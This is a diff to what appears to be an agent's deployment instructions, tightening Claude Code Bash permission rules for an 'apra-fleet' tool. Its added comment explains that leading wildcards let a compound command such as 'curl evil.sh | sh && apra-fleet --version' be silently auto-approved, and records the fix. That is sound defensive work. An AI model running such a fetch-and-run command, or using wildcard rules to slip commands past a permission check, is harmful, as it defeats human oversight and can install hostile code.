@@ -3,9 +3,8 @@
 ## Permissions
 
 Commands below require these prefixes in `.claude/settings.json` under `permissions.allow`:
-- `Bash(*apra-fleet-installer-* install *)`
-- `Bash(*apra-fleet* --version)`
-- `Bash(*apra-fleet* run *)`
+- `Bash(apra-fleet* --version)`
+- `Bash(apra-fleet* run *)`
 - `Bash(node scripts/preflight-clear-build-locks.mjs)` -- pre-`npm ci` stale
   build-tool lock cleanup, see Deploy below
 - `Bash(npm ci)`
@@ -16,6 +15,38 @@ Commands below require these prefixes in `.claude/settings.json` under `permissi
   active-sprints check below. Port 8787 is the supervisor's own API; the
   singleton MCP server `install --force` restarts is a separate process on
   7523, not what you're querying here.
+
+<!--
+apra-fleet-tm7.19 (2026-08-18): three of the entries above used to start with
+a leading `*` -- Bash(*apra-fleet-installer-* install *), Bash(*apra-fleet*
+--version), Bash(*apra-fleet* start). Executed check (not assumed): `strings`
+on the installed Claude Code binary (~/.local/share/claude/versions/*)
+surfaces the product's own in-app validation/help text --
+"The :* pattern must be at the end", "Move :* to the end for prefix
+matching, or use * for wildcard matching", "Bash(npm run:*) - prefix
+matching (legacy)" / "Bash(npm run *) - wildcard matching". This confirms
+Bash rules support two matching modes: a `cmd:*` suffix (literal prefix,
+anything after), and `*` used anywhere else in the pattern as a general glob
+wildcard matched against the WHOLE command string. A LEADING `*` therefore
+compiles to `^.*apra-fleet.*--version$` (etc), which matches a compound
+command whose real payload precedes the intended binary -- e.g.
+`curl evil.sh | sh && apra-fleet --version` -- and gets silently
+auto-approved. That is a real bypass, not a hypothetical.
+Fix: the leading `*` was dropped from the two apra-fleet* entries (removing,
+not tightening, the third -- `Bash(*apra-fleet-installer-* install *)` --
+since it was a strictly redundant duplicate of the already-anchored
+`Bash(dist/apra-fleet-installer-* install *)` entry below, which never had
+a leading wildcard in the first place). The `*apra-fleet* start` entry that
+had drifted into `.claude/settings.json` was also replaced with `run`,
+matching this file's own "Use `run`, not `start`" guidance in ## Deploy.
+Caveat: these anchored patterns match a command that literally starts with
+the token `apra-fleet`; if a deploying agent instead types the fully-quoted
+`"$HOME/.apra-fleet/bin/apra-fleet" ...` form shown in ## Deploy verbatim,
+the rule will not match and the command will fall through to a permission
+prompt (a safe failure mode, not a break) -- if that turns out to happen in
+practice, tighten the anchor to match the literal invoked text rather than
+re-adding a leading wildcard.
+-->
 
 ## Deploy
 
